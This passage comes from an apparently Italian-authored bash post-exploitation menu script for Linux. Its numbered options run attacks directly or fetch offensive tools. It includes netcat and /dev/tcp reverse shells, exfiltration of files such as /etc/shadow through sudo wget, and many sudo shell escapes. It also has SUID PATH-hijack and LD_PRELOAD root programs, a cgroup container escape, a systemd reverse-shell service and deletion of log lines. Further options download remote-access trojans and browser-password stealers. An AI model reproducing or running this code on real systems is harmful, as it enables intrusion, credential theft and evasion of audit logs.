		Scarica "T3rry7f/ICMPTunnel/IcmpTunnel_C" "$ENTRAW""T3rry7f/ICMPTunnel/master/IcmpTunnel_C.py" "IcmpTunnel_C.py"
	;;
	"22")
		Scarica "cytopia/pwncat" "$ENTRAW""cytopia/pwncat/master/bin/pwncat" "pwncat.py"
	;;
	"23")
		if [[ -f ./shell.py ]];
		then
			python ./shell.py
		else
			Scarica "s0md3v/JShell/shell" "$ENTRAW""s0md3v/JShell/master/shell.py" "shell.py"
		fi
	;;
	"24")
		echo "digit in your machine nc -lvnp 80 > file-received"
		read -p "digit the fullpath of wget listed in sudo -l (example /usr/bin/wget): " SUDOWGET
		read -p "digit your IP remote machine (example 10.10.4.13): " MYIP
		read -p "digit filename to send to your remote machine (example /etc/shadow): " NOMEFL
		if [[ "$SUDOWGET" != "" ]];
		then
			if [[ "$NOMEFL" != "" && "$MYIP" != "" ]];
			then
				sudo $SUDOWGET --post-file=$NOMEFL $MYIP
			fi
		fi
	;;
	"25")
		touch test.txt
		sudo zip 1.zip test.txt -T --unzip-command="sh -c /bin/bash"
	;;
	"26")
		sudo perl -e 'exec "/bin/bash";'
	;;
	"27")
		sudo git help config
	;;
	"28")
		echo "trying method 1"
		sudo apt-get update -o APT::Update::Pre-Invoke::= /bin/bash
		echo "trying method 2"
		sudo apt-get changelog apt
		echo "trying method 3"
		TF=$(mktemp)
		echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
		sudo apt-get install -c $TF sl
		echo "trying method 4"
		read -p "Digit your IP: " MYIP
		read -p "Digit your port: " MYPORT
		if [[ "$MYIP" != "" && "$MYPORT" != "" ]];
		then
			echo "apt::Update::Pre-Invoke {\“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $MYIP $MYPORT >/tmp/f\”};" > pwn
		fi
	;;
	"29")
		read -p "Digit the filename to read: " FILENAME
		if [[ "$FILENAME" != "" ]];
		then
			sudo cat $FILENAME
		fi
	;;
	"30")
		Scarica "Greenwolf/Spray/spray.sh" "$ENTRAW""Greenwolf/Spray/master/spray.sh" "spray.sh"
		Scarica "Greenwolf/Spray/passwords-English.txt" "$ENTRAW""Greenwolf/Spray/master/passwords-English.txt" "passwords-English.txt"
	;;
	"31")
		Scarica "NetSPI/PS_MultiCrack" "$ENTRAW""NetSPI/PS_MultiCrack/master/PS_MultiCrack.sh" "PS_MultiCrack.sh"
	;;
	"32")
		Scarica "TiagoANeves/TDTLinuxPWD" "$ENTRAW""TiagoANeves/TDTLinuxPWD/master/TDTLinuxPWD.py" "TDTLinuxPWD.py"
	;;
	"33")
		if [[ -f ./dnsteal.py ]];
		then
			python ./dnsteal.py 127.0.0.1 -z -v
		else
			Scarica "m57/dnsteal" "$ENTRAW""m57/dnsteal/master/dnsteal.py" "dnsteal.py"
		fi
	;;
	"34")
		Scarica "pentestmonkey/unix-privesc-check" "$ENTSSL""pentestmonkey/unix-privesc-check/archive/master.zip" "unix-privesc-check.zip"
	;;
	"40")
		Scarica "dinigalab/ldapsearch" "$ENTRAW""dinigalab/ldapsearch/master/ldapsearch.py" "ldapsearch.py"
	;;
	"41")
		echo "Digit a folder name or folder/subfolder from https://github.com/SecureAuthCorp/impacket"
		read -p "(example impacket or impacket/ldap): " FOLD
		if [[ "$FOLD" != "" ]];
		then
			echo "Digit a file name from https://github.com/SecureAuthCorp/impacket/tree/master/""$FOLD"" with extension"
			read -p "(example exploit.py): " FILE
			if [[ "$FILE" != "" ]];
			then
				Scarica "SecureAuthCorp/impacket/$FOLD/$FILE" "SecureAuthCorp/impacket/master/$FOLD/$FILE" "$FILE"
			fi
		fi
	;;
	"50")
		Scarica "volatilityfoundation/volatility" "$ENTSSL""volatilityfoundation/volatility/archive/master.zip" "volatility.zip"
	;;
	"99")
		read -p "digit your IP remote machine (example http://10.10.4.13 OR http://192.168.10.10/public): " IP
		read -p "digit your exploit file from your remote machine to download in this local machine (example exploit.sh): " FILENAME
		if [[ "$FILENAME" != "" && "$IP" != "" ]];
		then
			Scarica "$IP/$FILENAME" "$IP/$FILENAME" "$FILENAME"
		fi
	;;
	"100")
		echo "Reverse Shell with netcat"
		read -p "digit your IP remote machine (example 10.10.4.13): " IP
		read -p "digit your Port remote machine (example 9001): " PORTA
		if [[ "$PORTA" != "" && "$IP" != "" ]];
		then
			rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORTA >/tmp/f
		fi
	;;
	"101")
		echo "Reverse Shell with bash"
		read -p "digit your IP remote machine (example 10.10.4.13): " IP
		read -p "digit your Port remote machine (example 9001): " PORTA
		if [[ "$PORTA" != "" && "$IP" != "" ]];
		then
			bash -i >& /dev/tcp/$IP/$PORTA 0>&1
		fi
	;;
	"102")
		read -p "Paste your base64 encoded text: " TEXTENC
		if [[ "$TEXTENC" != "" ]];
		then
			echo "$TEXTENC" | base64 -d > textdecode.txt
			echo "text decoded to textdecode.txt"
		else
			echo "Digit a valid base64 text"
		fi
	;;
	"103")
		read -p "Paste your base64 encoded text: " TEXTENC
		if [[ "$TEXTENC" != "" ]];
		then
			echo "$TEXTENC" | base64 -d | bash
			echo "text decoded to textdecode.txt"
		else
			echo "Digit a valid base64 text"
		fi
	;;
	"104")
		if [[ -f $(which gcc) ]];
		then
			MIOPATH="$PWD"
			echo -ne "#include <unistd.h>\nvoid main()\n{\nsetuid(0);\nsetgid(0);\nsystem(\"ps\");\n}" > root.c
			gcc root.c -o root
			chmod u+s root
			./root
			cd /tmp
			echo "/bin/bash" > ps
			chmod 777 ps
			echo $PATH
			export PATH=/tmp:$PATH
			cd "$MIOPATH"
			./root
			if [[ $(whoami) != "root" ]];
			then
				cd "$MIOPATH"
				cp /bin/sh /tmp/ps
				echo $PATH
				export PATH=/tmp:$PATH
				./root
				if [[ $(whoami) != "root" ]];
				then
					cd "$MIOPATH"
					ln -s /bin/sh ps
					export PATH=.:$PATH
					./root
					id
					whoami
				fi
			fi
		else
			echo "gcc does not exist"
		fi
	;;
	"105")
		if [[ -f $(which gcc) ]];
		then
			MIOPATH="$PWD"
                        echo -ne "#include <unistd.h>\nvoid main()\n{\nsetuid(0);\nsetgid(0);\nsystem(\"id\");\n}" > root2.c
                        gcc root2.c -o root2
			chmod u+s root2
			cd /tmp
			echo "/bin/bash" > id
			chmod 777 id
			echo $PATH
			export PATH=/tmp:$PATH
			cd "$MIOPATH"
			./root2
			whoami
		else
                        echo "gcc does not exist"
                fi
	;;
	"106")
		if [[ -f $(which gcc) ]];
		then
			MIOPATH="$PWD"
                        echo -ne "#include <unistd.h>\nvoid main()\n{\nsetuid(0);\nsetgid(0);\nsystem(\"cat /etc/passwd\");\n}" > root3.c
			gcc root3.c -o root3
			chmod u+s root3
			cd /tmp
			nano cat
			chmod 777 cat
			echo $PATH
			export PATH=/tmp:$PATH
			cd "$MIOPATH"
			./root3
			whoami
		else
                        echo "gcc does not exist"
                fi
	;;
	"107")
		sudo vim -c '!sh'
	;;
	"108")
		sudo -u root vim -c '!sh'
	;;
	"109")
		Scarica "nongiach/sudo_inject" "$ENTSSL""nongiach/sudo_inject/archive/master.zip" "sudo_inject.zip"
	;;
	"110")
		read -p "Paste escaped hex values" HEXD
		if [[ "$HEXD" != "" ]];
		then
			echo -ne "$HEXD" > elf.bin
			chmod +x elf.bin
		fi
	;;
	"111")
		find / -writable -type  f 2>/dev/null | grep -v "/proc/"
	;;
	"112")
		Scarica "corelan/mona" "$ENTSSL""corelan/mona/archive/master.zip" "mona.zip"
	;;
	"113")
		Scarica "utkusen/shotlooter" "$ENTRAW""utkusen/shotlooter/master/shotlooter.py" "shotlooter.py"
	;;
	"114")
		Scarica "porterhau5/bash-port-scanner/scanner" "$ENTRAW""porterhau5/bash-port-scanner/master/scanner" "scanner.sh"
	;;
	"115")
		Scarica "davidmerrick/Python-Port-Scanner/port_scanner" "$ENTRAW""davidmerrick/Python-Port-Scanner/master/port_scanner.py" "port_scanner.py"
	;;
	"116")
		Scarica "sensepost/dwn" "ENTSSL""sensepost/dwn/archive/master.zip" "dwn.zip"
	;;
	"120")
		ls *.zip
		read -p "Digit a zip file: " FILENOME
		if [[ "$FILENOME" != "" ]];
		then
			if [[ -f "$FILENOME" ]];
			then
				unzip "$FILENOME"
			else
				echo "$FILENOME does not exist"
			fi
		fi
	;;
	"121")
		read -p "Digit first three IPv4 Values dotted (example, 192.168.1): " IPT
		if [[ "$IPT" != "" ]];
		then
			if [[ "$IPT" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]];
			then
				for (( RANGE=0 ; RANGE<256 ; RANGE++ ));
				do
					ping -c 1 "$IPT"".""$RANGE" | grep "from"
				done
			else
				echo "ERROR: invalid IPv4 three values dotted"
			fi
		fi
	;;
	"130")
		if [[ -f ./upnp_info.py ]];
		then
			python ./upnp_info.py
		else
			Scarica "tenable/upnp_info" "$ENTRAW""tenable/upnp_info/master/upnp_info.py" "upnp_info.py"
		fi
	;;
	"131")
		Scarica "mlgualtieri/NTLMRawUnHide" "$ENTRAW""mlgualtieri/NTLMRawUnHide/master/NTLMRawUnHide.py" "NTLMRawUnHide.py"
	;;
	"132")
		Scarica "Alamot/code-snippets/winrm" "$ENTRAW""Alamot/code-snippets/master/winrm/winrm_shell_with_upload.rb" "winrm_shell_with_upload.rb"
		Scarica "Alamot/code-snippets/winrm" "$ENTRAW""Alamot/code-snippets/master/winrm/winrm_shell.rb" "winrm_shell.rb"
	;;
	"133")
		Scarica "blackarrowsec/mssqlproxy/mssqlclient" "$ENTRAW""blackarrowsec/mssqlproxy/master/mssqlclient.py" "mssqlclient.py"
	;;
	"134")
		Scarica "jtpereyda/enum4linux" "$ENTRAW""jtpereyda/enum4linux/master/enum4linux.pl" "enum4linux.pl"
		Scarica "jtpereyda/enum4linux/share-list.txt" "$ENTRAW""jtpereyda/enum4linux/master/share-list.txt" "share-list.txt"
	;;
	"135")
		Scarica "trustedsec/tscopy" "$ENTSSL""trustedsec/tscopy/archive/master.zip" "tscopy.zip"
	;;
	"136")
		if [[ -f $(which tcpdump) ]];
		then
			tcpdump -vA -i lo -w tcpdump.pcap
		else
			echo "tcpdump is not installed"
		fi
	;;
	"137")
		Scarica "sensepost/DNS-Shell" "$ENTRAW""sensepost/DNS-Shell/master/DNS-shell.py" "DNS-shell.py"
	;;
	"138")
		Scarica "diego-treitos/linux-smart-enumeration/lse" "$ENTRAW""diego-treitos/linux-smart-enumeration/master/lse.sh" "lse.sh"
	;;
	"139")
		Scarica "DanMcInerney/icebreaker" "$ENTSSL""DanMcInerney/icebreaker/archive/master.zip" "icebreaker.zip"
	;;
	"140")
		Scarica "nyov/python-ffpassdecrypt" "$ENTRAW""nyov/python-ffpassdecrypt/master/ffpassdecrypt.py" "ffpassdecrypt.py"
		Scarica "nyov/python-ffpassdecrypt" "$ENTRAW""nyov/python-ffpassdecrypt/master/firefox_passwd.py" "firefox_passwd.py"
	;;
	"141")
		Scarica "pradeep1288/ffpasscracker" "$ENTRAW""pradeep1288/ffpasscracker/master/ffpassdecrypt.py" "ffpassdecrypt.py"
	;;
	"142")
		echo "Digit your remote IP or a specific substring to clear it from logs"
		read -p "(example, 192.168.1.1): " YOURIP
		if [[ "$YOURIP" != "" ]];
		then
			sed -e s/.*$YOURIP.*//g -i /var/log/*.log
		fi
	;;
	"143")
		if [[ -f $(which socat) ]];
		then
			echo "Digit a listen port"
			read -p "(example, 8000): " LPORT
			if [[ "$LPORT" != "" ]];
			then
				echo "Digit an IP to redirect its connection"
				read -p "(example, 192.168.0.3 or localhost): " IP
				if [[ "$IP" != "" ]];
				then
					echo "Digit the ""$IP""'s port"
					read -p "(example, 1337): " PORT
					if [[ "$PORT" != "" ]];
					then
						socat TCP-LISTEN:$LPORT,fork TCP:$IP:$PORT &
					fi
				fi
			fi
		else
			echo "Digit a socat fullpath"
			read -p "(example, ./socat): " SOCAT
			if [[ "$SOCAT" != "" ]];
			then
				if [[ -f "$SOCAT" ]];
				then
					echo "Digit a listen port"
					read -p "(example, 8000): " LPORT
					if [[ "$LPORT" != "" ]];
					then
						echo "Digit an IP to redirect its connection"
						read -p "(example, 192.168.0.3 or localhost): " IP
						if [[ "$IP" != "" ]];
						then
							echo "Digit the ""$IP"" port"
							read -p "(example, 1337): " PORT
							if [[ "$PORT" != "" ]];
							then
								$SOCAT TCP-LISTEN:$LPORT,fork TCP:$IP:$PORT &
							fi
						fi
					fi
				else
					echo "$SOCAT"" does not exist"
				fi
			fi
		fi

	;;
	"144")
		sudo -l
	;;
	"145")
		curl -X GET http://localhost:9200/esmapping/_search
		curl -X GET http://localhost:9200/_cat/indices?v
		while true; do
			echo "Digit an index to dump all docs"
			read -p "index name: " IND
			if [[ "$IND" != "" ]];
			then
				curl -X GET "http://localhost:9200/$IND/_search"
			fi
		done
	;;
	"146")
		lastlog
	;;
	"147")
		tail /var/log/auth.log
	;;
	"148")
		less ~/.bash_history
	;;
	"149")
		if [[ -f ./ffpass ]];
		then
			./ffpass export -f passwords.csv
		else
			Scarica "louisabraham/ffpass" "$ENTSSL""louisabraham/ffpass/archive/master.zip" "ffpass.zip"
		fi
	;;
	"150")
		Scarica "aarsakian/MFTExtractor" "$ENTRAW""aarsakian/MFTExtractor/master/MFTExtractor.go" "MFTExtractor.go"
	;;
	"151")
		Scarica "vulmon/Vulmap/Vulmap-Linux" "$ENTRAW""vulmon/Vulmap/master/Vulmap-Linux/vulmap-linux.py" "vulmap-linux.py"
	;;
	"152")
		Scarica "mthambipillai/password-cracker" "$ENTRAW""mthambipillai/password-cracker/master/password_cracker.py" "password_cracker.py"
	;;
	"153")
		Scarica "incredigeek/grond" "https://www.incredigeek.com/home/downloads/grond.sh" "grond.sh"
	;;
	"154")
		if [[ -f ./sudo_killer.sh ]];
		then
			./sudo_killer.sh -c
		else
			Scarica "TH3xACE/SUDO_KILLER" "$ENTSSL""TH3xACE/SUDO_KILLER/archive/master.zip" "SUDO_KILLER.zip"
		fi
	;;
	"155")
		Scarica "shahril96/socat-reverse-shell" "$GSTRAW""shahril96/c2d9dd7a93901c4876c7be1572cccb26/raw/5e96b09fd88e8aed800bd07bbee55f913bc53e95/socat-reverse-shell.sh" "socat-reverse-shell.sh"
	;;
	"156")
		Scarica "Doctor-love/revshell" "$ENTRAW""Doctor-love/revshell/master/revshell" "revshell"
	;;
	"157")
		Scarica "HightechSec/git-scanner/gitscanner" "$ENTRAW""HightechSec/git-scanner/master/gitscanner.sh" "gitscanner.sh"
	;;
	"158")
		Scarica "mikeborghi/pywallet" "$ENTRAW""mikeborghi/pywallet/master/pywallet.py" "pywallet.py"
	;;
	"159")
		URT="DominicBreuker/pspy/releases"
		URD="$URT""/download"
		select CHC in $(curl -s -k -L "$ENTSSL""$URT"|grep "href"|grep "$URD"|grep "pspy64s"|awk -F \" '{print $2}')
		do
			Scarica "DominicBreuker/pspy64s" "$ENTSSL""$CHC" "pspy64s"
			break
		done
	;;
	"160")
		URT="DominicBreuker/pspy/releases"
		URD="$URT""/download"
		select CHC in $(curl -s -k -L "$ENTSSL""$URT"|grep "href"|grep "$URD"|grep "pspy32s"|awk -F \" '{print $2}')
		do
			Scarica "DominicBreuker/pspy32s" "$ENTSSL""$CHC" "pspy32s"
			break
		done
	;;
	"161")
		echo -e "#include <sys/stat.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void){\nmkdir(\"chroot-dir\", 0755);\nchroot(\"chroot-dir\");\nfor(int i = 0; i < 1000; i++){\nchdir(\"..\");\n}\nchroot(\".\");\nsystem(\"/bin/bash\");\n}" > root4.c
		gcc root4.c -o root4
		chmod +x root4
		./root4
		whoami
	;;
	"162")
		if [[ -f ./packetWhisper.py ]];
		then
			python ./packetWhisper.py
		else
			Scarica "TryCatchHCF/PacketWhisper/cloakify" "$ENTRAW""TryCatchHCF/PacketWhisper/master/cloakify.py" "cloakify.py"
			Scarica "TryCatchHCF/PacketWhisper/decloakify" "$ENTRAW""TryCatchHCF/PacketWhisper/master/decloakify.py" "decloakify.py"
			Scarica "TryCatchHCF/PacketWhisper/packetWhisper" "$ENTRAW""TryCatchHCF/PacketWhisper/master/packetWhisper.py" "packetWhisper.py"
		fi
	;;
	"163")
		URT="jpillora/chisel/releases"
		URD="$URT""/download"
		select CHC in $(curl -s -k -L "$ENTSSL""$URT"|grep "href"|grep "$URD"|grep "linux_amd64"|awk -F \" '{print $2}')
		do
			Scarica "jpillora/chisel_linux_amd64" "$ENTSSL""$CHC" "chisel_linux_amd64.gz"
			break
		done
	;;
	"164")
		URT="jpillora/chisel/releases"
		URD="$URT""/download"
		select CHC in $(curl -s -k -L "$ENTSSL""$URT"|grep "href"|grep "$URD"|grep "linux_386"|awk -F \" '{print $2}')
		do
			Scarica "jpillora/chisel_linux_386" "$ENTSSL""$CHC" "chisel_linux_386.gz"
			break
		done
	;;
	"165")
		Scarica "pahaz/sshtunnel" "$ENTSSL""pahaz/sshtunnel/archive/master.zip" "sshtunnel.zip"
	;;
	"166")
		Scarica "KuroLabs/stegcloak" "$ENTSSL""KuroLabs/stegcloak/archive/master.zip" "stegcloak.zip"
	;;
	"167")
		echo "Digit an exploit file name without extension"
		read -p "(example, 460): " EXPL
		if [[ "$EXPL" != "" ]];
		then
			Scarica "$EXDB""$EXPL" "$EXDB""download/""$EXPL" "$EXPL"
		fi
	;;
	"168")
		echo "Digit a file extension without dot"
		read -p "(example, xml): " EXT
		if [[ "$EXT" != "" ]];
		then
			echo "Digit one or more keywords to search, separated by a bckslash and pipe"
			read -p "(example, password\|passwd): " PSKEY
			if [[ "$PSKEY" != "" ]];
			then
				echo "Digit a path to search"
				read -p "(example, /home/user): " FLDR
				if [[ -d "$FLDR" ]];
				then
					grep -ir -w "$PSKEY" --include "*.""$EXT" "$FLDR" 2>/dev/null
				fi
			fi
		fi
	;;
	"169")
		echo 'stats items' | nc localhost 11211 | grep -oe ':[0-9]*:' | grep -oe '[0-9]*' | sort | uniq | xargs -L1 -I{} bash -c 'echo "stats cachedump {} 1000" | nc localhost 11211'
	;;
	"170")
		Scarica "bettercap/bettercap" "$ENTSSL""bettercap/bettercap/releases/download/v2.30.2/bettercap_linux_amd64_v2.30.2.zip" "bettercap_amd64_v2.30.2.zip"
	;;
	"171")
		mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/xecho 1 > /tmp/cgrp/x/notify_on_release
		host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
		echo "$host_path/cmd" > /tmp/cgrp/release_agentecho '#!/bin/sh' > /cmd
		echo "ps aux > $host_path/output" >> /cmd
		chmod a+x /cmdsh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
	;;
	"172")
		if [[ -f ./blowhole.py ]];
		then
			python blowhole.py -i -a -o blowhole.report
		else
			Scarica "Keramas/Blowhole" "$ENTRAW""Keramas/Blowhole/master/blowhole.py" "blowhole.py"
		fi
	;;
	"173")
		if [[ -f ./deepce.sh ]];
		then
			./deepce.sh
		else
			Scarica "stealthcopter/deepce" "$ENTRAW""stealthcopter/deepce/master/deepce.sh" "deepce.sh"
		fi
	;;
	"174")
		echo "Digit a tar.gz file full path to extract"
		ls *.tar.gz
		read -p "(example, ./example.tar.gz): " FLTR
		if [[ -f "$FLTR" ]];
		then
			tar zxvf "$FLTR"
		fi
	;;
	"175")
		Scarica "nccgroup/go-pillage-registries_1.0_Linux_i386" "$ENTSSL""nccgroup/go-pillage-registries/releases/download/v1.0/go-pillage-registries_1.0_Linux_i386.tar.gz" "go-pillage-registries_1.0_Linux_i386.tar.gz"
	;;
	"176")
		Scarica "nccgroup/go-pillage-registries_1.0_Linux_x86_64" "$ENTSSL""nccgroup/go-pillage-registries/releases/download/v1.0/go-pillage-registries_1.0_Linux_x86_64.tar.gz" "go-pillage-registries_1.0_Linux_x86_64.tar.gz"
	;;
	"177")
		echo "Digit a command with arguments"
		read -p "(example, ls -la): " CMD
		if [[ "$CMD" != "" ]];
		then
			curl -k -XPOST "https://k8s-node-1:10250/run/kube-system/node-exporter-iuwg7/node-exporter" -d "cmd=""$CMD"
		fi
	;;
	"178")
		if [[ -f $(which strace) ]];
		then
			if [[ -f $(which ltrace) ]];
			then
				echo "Digit an executable file name to analyze"
				read -p "(example, ./sysinfo): " EXF
				if [[ -f "$EXF" ]];
				then
					echo "Digit a report file name"
					read -p "(example, sysinfo): " RPF
					if [[ "$RPF" != "" ]];
					then
						strace -f -i -o "$RPF"".strace" "$EXF"
						ltrace -f -i -o "$RPF"".ltrace" "$EXF"
					fi
				fi
			else
				echo "ltrace not found!"
			fi
		else
			echo "strace not found!"
		fi
	;;
	"179")
		Scarica "hasanbulat/tshark" "$ENTSSL""hasanbulat/tshark/raw/master/bin/tshark" "tshark"
	;;
	"180")
		Scarica "hasanbulat/tshark/dumpcap" "$ENTSSL""hasanbulat/tshark/raw/master/bin/dumpcap" "dumpcap"
	;;
	"181")
		Scarica "dylanaraps/neofetch" "$ENTRAW""dylanaraps/neofetch/master/neofetch" "neofetch"
		Scarica "dylanaraps/neofetch/neofetch.1" "$ENTRAW""dylanaraps/neofetch/master/neofetch.1" "neofetch.1"
	;;
	"182")
		echo "testing sudoedit vulnerability..."
		sudoedit -s /
		echo "Digit a command with arguments"
		read -p "(example, perl -e 'print \"A\" x 65536'): " CMD
		if [[ "$CMD" != "" ]];
		then
			echo "Copy and paste this command to escalate privs"
			echo "sudoedit -s '\' \`""$CMD""\`"
		fi
	;;
	"183")
		echo "Digit your IP"
		read -p "(example, 10.11.12.13): " MIP
		if [[ "$MIP" != "" ]];
		then
			echo "Digit your PORT"
			read -p "(example, 4444): " MPRT
			if [[ "$MPRT" != "" ]];
			then
				echo -ne "[Unit]\nDescription=root\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/""$MIP""/""$MPRT"" 0>&1'\n\n[Install]\nWantedBy=multi-user.target\n" > test.service
				echo "run 'nc -lvnp ""$MPRT""' in your host or execute linuxallremote and select 102 option"
				read -p "Press enter to run RevShell"
				systemctl enable ./test.service
			fi
		fi
	;;
	"184")
		echo "Digit a file to read"
		read -p "(example, ./secret.txt): " RFL
		if [[ -f "$RFL" ]];
		then
			sudo arp -v -f "$RFL"
		fi
	;;
	"185")
		echo "Digit a file to read"
		read -p "(example, ./secret.txt): " RFL
		if [[ -f "$RFL" ]];
		then
			sudo cut -d "" -f1 "$RFL"
		fi
	;;
	"186")
		echo "Digit a file to read"
		read -p "(example, ./secret.txt): " RFL
		if [[ -f "$RFL" ]];
		then
			sudo base64 "$RFL" | sudo base64 --decode
		fi
	;;
	"187")
		echo "Digit a file to read"
		read -p "(example, ./secret.txt): " RFL
		if [[ -f "$RFL" ]];
		then
			sudo tail "$RFL"
		fi
	;;
	"188")
		echo "Digit a file to read"
		read -p "(example, ./secret.txt): " RFL
		if [[ -f "$RFL" ]];
		then
			sudo ul "$RFL"
		fi
	;;
	"189")
		sudo php5 -r "pcntl_exec('/bin/sh');"
	;;
	"190")
		echo "Digit a file to read"
		read -p "(example, ./secret.txt): " RFL
		if [[ -f "$RFL" ]];
		then
			sudo file -m "$RFL"
		fi
	;;
	"191")
		echo "Digit a file to read"
		read -p "(example, ./secret.txt): " RFL
		if [[ -f "$RFL" ]];
		then
			echo "digit exec cat ""$RFL"
			sudo tclsh8.5
		fi
	;;
	"192")
		sudo env /bin/sh
	;;
	"193")
		echo "Digit a file to read"
		read -p "(example, ./secret.txt): " RFL
		if [[ -f "$RFL" ]];
		then
			sudo diff --line-format=%L /dev/null "$RFL"
		fi
	;;
	"194")
		sudo strace -o /dev/null /bin/sh
	;;
	"195")
		sudo awk 'BEGIN {system("/bin/bash")}'
	;;
	"196")
		sudo find / -exec bash -i \
	;;
	"197")
		sudo find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}'
	;;
	"198")
		echo "After less command, digit 'v' and then digit 'shell'"
		read -p "Press enter to continue"
		sudo less /etc/shadow
	;;
	"199")
		echo "After running more, digit '!/bin/bash'"
		read -p "Press enter to continue"
		echo "test">test.txt
		sudo more test.txt
	;;
	"200")
		find / -user root -perm 400 -print 2>/dev/null
	;;
	"201")
		echo "Digit /bin/sh and the Press Ctrk+T"
		read -p "Press enter to continue"
		sudo nano -s /bin/sh
	;;
	"202")
		sudo apache2 -f /etc/shadow
	;;
	"203")
		echo -ne "#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init(){\nunsetenv(\"LD_PRELOAD\");\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/bash\");\n}">testr00t.c
		gcc -fPIC -shared -o /tmp/testr00t.so testr00t.c -nostartfiles & sudo LD_PRELOAD=/tmp/testr00t.so apache2
	;;
	"204")
		getcap -r / 2>/dev/null
	;;
	"205")
		echo "Digit a python full path listed in checking capabilities"
		read -p "(example, /usr/bin/python2.6): " PYT
		if [[ -f "$PYT" ]];
		then
			sudo $PYT -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'
		fi
	;;
	"206")
		Scarica "BenChaliah/Arbitrium-RAT" "$ENTSSL""BenChaliah/Arbitrium-RAT/archive/main.zip" "Arbitrium-RAT.zip"
	;;
	"207")
		Scarica "moonD4rk/HackBrowserData-32bit" "$ENTSSL""moonD4rk/HackBrowserData/releases/download/v0.3.3/hack-browser-data-v0.3.3-linux-32bit.zip" "hack-browser-data-v0.3.3-linux-32bit.zip"
	;;
	"208")
		Scarica "moonD4rk/HackBrowserData-64bit" "$ENTSSL""moonD4rk/HackBrowserData/releases/download/v0.3.3/hack-browser-data-v0.3.3-linux-64bit.zip" "hack-browser-data-v0.3.3-linux-64bit.zip"
	;;
	"209")
		Scarica "deepsecurity-pe/GoGhost" "$ENTSSL""deepsecurity-pe/GoGhost/raw/master/GoGhost_linux_amd64" "GoGhost_linux_amd64"
	;;
	"210")
		echo "Paste the base64 encrypted file"
		read -p "paste now" BFL
		if [[ "$BFL" != "" ]];
		then
			echo "Digit the encrypted file name to create before decrypt it"
			read -p "(example, payload.enc): " ENFL
			if [[ "$ENFL" != "" ]];
			then
				echo "Digit the password to decrypt the file"
				read -p "Password: " PSSWD
				if [[ "$PSSWD" != "" ]];
				then
					base64 -d "$BFL" > "$ENFL"
					echo "Do you want pipe to bash or save it in a file?"
					read -p "Do you want save it (Y/n)? " RSP
					if [[ "$RSP" == "Y" ]];
					then
						unzip -P "$PSSWD" "$ENFL"
					else
						unzip -c -P "$PSSWD" "$ENFL" | bash
					fi
				fi
			fi
		fi
	;;
	"211")
		Scarica "fatedier/frp_386" "$ENTSSL""fatedier/frp/releases/download/v0.35.1/frp_0.35.1_linux_386.tar.gz" "frp_0.35.1_linux_386.tar.gz"
	;;
	"212")
		Scarica "fatedier/frp_amd64" "$ENTSSL""fatedier/frp/releases/download/v0.35.1/frp_0.35.1_linux_amd64.tar.gz" "frp_0.35.1_linux_amd64.tar.gz"
	;;
	"213")
		Scarica "fatedier/frp_arm" "$ENTSSL""fatedier/frp/releases/download/v0.35.1/frp_0.35.1_linux_arm.tar.gz" "frp_0.35.1_linux_arm.tar.gz"
	;;
	"214")
		Scarica "fatedier/frp_arm64" "$ENTSSL""fatedier/frp/releases/download/v0.35.1/frp_0.35.1_linux_arm64.tar.gz" "frp_0.35.1_linux_arm64.tar.gz"
	;;
	"215")
		Scarica "jpillora/chisel_arm64" "$ENTSSL""jpillora/chisel/releases/download/v1.7.4/chisel_1.7.4_linux_arm64.gz" "chisel_1.7.4_linux_arm64.gz"
	;;
	"216")
		Scarica "jpillora/chisel_armv7" "$ENTSSL""jpillora/chisel/releases/download/v1.7.4/chisel_1.7.4_linux_armv7.gz" "chisel_1.7.4_linux_armv7.gz"
	;;
	"217")
		Scarica "jpillora/chisel_armv6" "$ENTSSL""jpillora/chisel/releases/download/v1.7.4/chisel_1.7.4_linux_armv6.gz" "chisel_1.7.4_linux_armv6.gz"
	;;
	"218")
		echo "Do you want to set an higher level of bypassing/evasion"
		echo "An higher level of evasion/bypassing will pipe download scripts in a bash thread"
		read -p "Digit 1 to enable, 0 (zero) to disable" SEC
		if [[ "$SEC" != "1" ]];
		then
			SEC="0"
		fi
	;;
	"219")
		if [[ -f $(which sysdiagnose) ]];
		then
			sysdiagnose -f ./
		else
			echo "sysdiagnose not installed"
		fi
	;;
	"220")
		echo "Digit a listen port"
		read -p "(example, 8000): " LPORT
		if [[ "$LPORT" != "" ]];
		then
			echo "Digit an IP to redirect its connection"
			read -p "(example, 192.168.0.3 or localhost): " IP
			if [[ "$IP" != "" ]];
			then
				echo "Digit the localhost's port"
				read -p "(example, 1337): " PORT
				if [[ "$PORT" != "" ]];
				then
					ssh -L "$LPORT"":""$IP"":""$PORT"
				fi
			fi
		fi
	;;
	"221")
		echo "Navigate to ""$ENTSSL""andrew-d/static-binaries/tree/master/binaries/linux/x86_64"
		echo "Digit a binary to download"
		read -p "(example, socat): " BFL
		if [[ "$BFL" != "" ]];
		then
			Scarica "andrew-d/static-binaries/linux/x86_64/""$BFL" "$ENTSSL""andrew-d/static-binaries/raw/master/binaries/linux/x86_64/""$BFL" "$BFL"
		fi
	;;
	"222")
		echo "Navigate to ""$ENTSSL""andrew-d/static-binaries/tree/master/binaries/linux/x86"
		echo "Digit a binary to download"
		read -p "(example, socat): " BFL
		if [[ "$BFL" != "" ]];
		then
			Scarica "andrew-d/static-binaries/linux/x86/""$BFL" "$ENTSSL""andrew-d/static-binaries/raw/master/binaries/linux/x86/""$BFL" "$BFL"
		fi
	;;
	"223")
		echo "Navigate to ""$ENTSSL""andrew-d/static-binaries/tree/master/binaries/linux/arm"
		echo "Digit a binary to download"
		read -p "(example, socat): " BFL
